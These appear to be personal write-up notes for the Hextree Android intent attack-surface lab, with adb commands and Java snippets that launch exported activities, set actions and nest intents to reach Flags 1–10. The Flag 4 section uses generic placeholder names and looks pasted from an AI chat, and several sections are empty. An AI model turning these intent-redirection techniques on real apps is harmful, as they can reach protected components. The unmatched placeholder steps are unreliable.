
# Starting Activities

Activities are responsible to render the screen of an app. So if your app has multiple screens, you can use `startActivity()` to start another activity. To do that you have to create an Intent object and target a specific activity class.

```
Intent intent = new Intent();
intent.setComponent(new ComponentName("io.hextree.activitiestest", "io.hextree.activitiestest.SecondActivity"));
startActivity(intent);
```

An alternative syntax to specify the target package and activity is also:

```
Intent intent = new Intent();
intent.setClassName("io.hextree.activitiestest", "io.hextree.activitiestest.SecondActivity");
startActivity(intent);
```

An app can always start any of its own activities, but in order to allow other apps to start your activity, they have to be exported. There is also one exported activity by default, which is the "launcher activity" that is used as a main entry point into the app. This allows the home screen or launcher application to start your app when you click it.





# Flag 1 

as the first activity is exported in the manifest we can just call it using

```
adb shell am start -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
```


# Flag 2

the second activity is also exported but needs an extra action to be passed which can be found using static analysis 

```
   protected void onCreate(Bundle bundle) {  
        super.onCreate(bundle);  
        this.f = new LogHelper(this);  
        String action = getIntent().getAction();  
        if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {  
            return;  
        }  
        this.f.addTag(action);  
        success(this);  
    }  
}
```

as here we can see that the oncreate returns nothing if action is null or not equal to io.hextree.action.GIVE_FLAG  so now modifying the intent we get 

```
adb shell am start -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag2Activity -a io.hextree.action.GIVE_FLAG
```

-a to specify the action io.hextree.action.GIVE_FLAG


# Parcel
# Binder


# Flag 4

To trigger `success(this)`, you must advance the state machine sequentially through 4 steps using different intent actions.

Assuming the target component is an **Activity** (or a Broadcast Receiver / Service depending on how `stateMachine` is called), you must run these commands in order.

Step 1: Transition from INIT (0) to PREPARE (1)

bash

```
adb shell am start -a PREPARE_ACTION -n com.package.name/.TargetComponent
```

Use code with caution.

Step 2: Transition from PREPARE (1) to BUILD (2)

bash

```
adb shell am start -a BUILD_ACTION -n com.package.name/.TargetComponent
```

Use code with caution.

Step 3: Transition from BUILD (2) to GET_FLAG (3)

bash

```
adb shell am start -a GET_FLAG_ACTION -n com.package.name/.TargetComponent
```

Use code with caution.

Step 4: Trigger Success from GET_FLAG (3)

Once the state is `3` (GET_FLAG), any intent that doesn't hit a fallback will trigger the flag. You can send any placeholder action (or no action at all):

bash

```
adb shell am start -a TRIGGER -n com.package.name/.TargetComponent
```

Use code with caution.

---

Important Requirements

1. **Component Type:** If this code runs inside a `BroadcastReceiver`, replace `am start -n` with `am broadcast -a <ACTION>`.
2. **No Interruption:** You must run these commands back-to-back. If you send an incorrect action or an unexpected intent, the code hits the fallback (`setCurrentState(State.INIT)`) and resets your progress.


# Flag 5


The Hextree `Flag5Activity` challenge ("Intent in Intent") expects a deeply **nested hierarchy of three Intents** to unlock the success state: [[1](https://medium.com/@alaamansouraliahmed/flag5activity-intent-in-intent-hextree-write-up-cc42ce9338dc), [2](https://www.pwny.cc/so/android/intent), [3](https://d4vnull.medium.com/hextree-intent-attack-surface-android-pentesting-walkthrough-47d975606711)]

1. **Outer Intent**: Targets `Flag5Activity`. It holds a parcelable extra under the key `"android.intent.extra.INTENT"` containing the Middle Intent.
2. **Middle Intent**: Contains an integer extra `"return"` set to `42`. It also holds another parcelable extra under the key `"nextIntent"` containing the Inner Intent.
3. **Inner Intent**: Contains a string extra `"reason"` set to `"back"`. [[1](https://medium.com/@alaamansouraliahmed/flag5activity-intent-in-intent-hextree-write-up-cc42ce9338dc), [2](https://www.pwny.cc/so/android/intent)]
4. 
```
// 1. Create the deeply nested Inner Intent
Intent innerIntent = new Intent();
innerIntent.putExtra("reason", "back");

// 2. Create the Middle Intent and bundle the Inner Intent inside it
Intent middleIntent = new Intent();
middleIntent.putExtra("return", 42);
middleIntent.putExtra("nextIntent", innerIntent);

// 3. Create the Main Outer Intent targeting Flag5Activity
Intent mainIntent = new Intent();
mainIntent.setComponent(new ComponentName(
    "io.hextree.attacksurface", 
    "io.hextree.attacksurface.activities.Flag5Activity"
));
mainIntent.putExtra("android.intent.extra.INTENT", middleIntent);

// 4. Launch the lifecycle chain
startActivity(mainIntent);


```


```
adb shell 'am start -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag5Activity --es "android.intent.extra.INTENT" "(intent#Intent;i.return=42;S.nextIntent=\(intent#Intent;S.reason=back;end\);end)"'
```


# FLAG 7 

```
package com.example.hextree;  
  
import android.content.ComponentName;  
import android.content.Intent;  
import android.os.Bundle;  
import android.util.Log;  
import android.view.View;  
import android.widget.Button;  
  
import androidx.activity.EdgeToEdge;  
import androidx.appcompat.app.AppCompatActivity;  
import androidx.core.graphics.Insets;  
import androidx.core.view.ViewCompat;  
import androidx.core.view.WindowInsetsCompat;  
  
public class MainActivity extends AppCompatActivity {  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        EdgeToEdge.enable(this);  
        setContentView(R.layout.activity_main);  
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {  
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());  
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);  
            return insets;  
        });  
  
        Intent intent =getIntent();  
        Utils.showDialog(this,intent);  
        ((Button) findViewById(R.id.btn_launch_activity)).setOnClickListener(new View.OnClickListener(){  
            @Override  
            public void onClick(View v) {  
                Intent intent = new Intent();  
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));  
                intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);  
  
                // First call: OPEN  
                intent.setAction("OPEN");  
                startActivity(intent);  
  
                // Second call: REOPEN after 1 second  
                // Deliver to the same instance via onNewIntent                v.postDelayed(() -> {  
                    intent.setAction("REOPEN");  
                    startActivity(intent);  
                }, 1000);  
            }  
        });  
  
    }  
}
```

```
adb shell am start \

  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag7Activity \

  -a OPEN
  
adb shell am start \

  --activity-single-top \

  -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag7Activity \        

  -a REOPEN
```

# Flag6Activity

they need android 10 not work from android 14

```
package com.example.hextree;  
  
import android.content.ComponentName;  
import android.content.Intent;  
import android.os.Bundle;  
import android.view.View;  
import android.widget.Button;  
  
import androidx.appcompat.app.AppCompatActivity;  
  
public class MainActivity extends AppCompatActivity {  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  
  
        Button btn = findViewById(R.id.btn_launch_activity);  
  
        btn.setOnClickListener(new View.OnClickListener() {  
  
            @Override  
            public void onClick(View v) {  
  
                /*  
                 * Intent redirected by Flag5Activity                 */                Intent redirectIntent = new Intent();  
  
                redirectIntent.setComponent(  
                        new ComponentName(  
                                "io.hextree.attacksurface",  
                                "io.hextree.attacksurface.activities.Flag6Activity"  
                        )  
                );  
  
                // IMPORTANT:  
                // makes Flag5Activity call startActivity()                redirectIntent.putExtra("reason", "next");  
  
                // IMPORTANT:  
                // required by Flag6Activity                redirectIntent.addFlags(  
                        Intent.FLAG_GRANT_READ_URI_PERMISSION  
                );  
  
                /*  
                 * Nested Parcelable Intent                 */                Intent nestedIntent = new Intent();  
  
                nestedIntent.putExtra("return", 42);  
  
                nestedIntent.putExtra(  
                        "nextIntent",  
                        redirectIntent  
                );  
  
                /*  
                 * Exported activity                 */                Intent triggerIntent = new Intent();  
  
                triggerIntent.setComponent(  
                        new ComponentName(  
                                "io.hextree.attacksurface",  
                                "io.hextree.attacksurface.activities.Flag5Activity"  
                        )  
                );  
  
                triggerIntent.putExtra(  
                        "android.intent.extra.INTENT",  
                        nestedIntent  
                );  
  
                startActivity(triggerIntent);  
            }  
        });  
    }  
}
```

# Flag8 


```
package com.example.hextree;  
  
import android.content.ComponentName;  
import android.content.Intent;  
import android.os.Bundle;  
import android.widget.Button;  
import android.widget.Toast;  
  
import androidx.annotation.Nullable;  
import androidx.appcompat.app.AppCompatActivity;  
  
public class HextreeActivity extends AppCompatActivity {  
  
    private static final int REQUEST_CODE = 1337;  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  
  
        Button btn = findViewById(R.id.btn_launch_activity);  
  
        btn.setOnClickListener(v -> {  
  
            Intent intent = new Intent();  
  
            intent.setComponent(  
                    new ComponentName(  
                            "io.hextree.attacksurface",  
                            "io.hextree.attacksurface.activities.Flag8Activity"  
                    )  
            );  
  
            startActivityForResult(intent, REQUEST_CODE);  
        });  
    }  
  
    @Override  
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {  
        super.onActivityResult(requestCode, resultCode, data);  
  
        if (requestCode == REQUEST_CODE) {  
  
            Toast.makeText(  
                    this,  
                    "Returned from Flag8Activity",  
                    Toast.LENGTH_LONG  
            ).show();  
  
            if (data != null) {  
                Bundle extras = data.getExtras();  
  
                if (extras != null) {  
                    Toast.makeText(  
                            this,  
                            extras.toString(),  
                            Toast.LENGTH_LONG  
                    ).show();  
                }  
            }  
        }  
    }  
}

```


# Flag10

```
<intent-filter>  
    <action android:name="io.hextree.attacksurface.ATTACK_ME" />  
    <category android:name="android.intent.category.DEFAULT" />  
</intent-filter>
```


# Flag 11

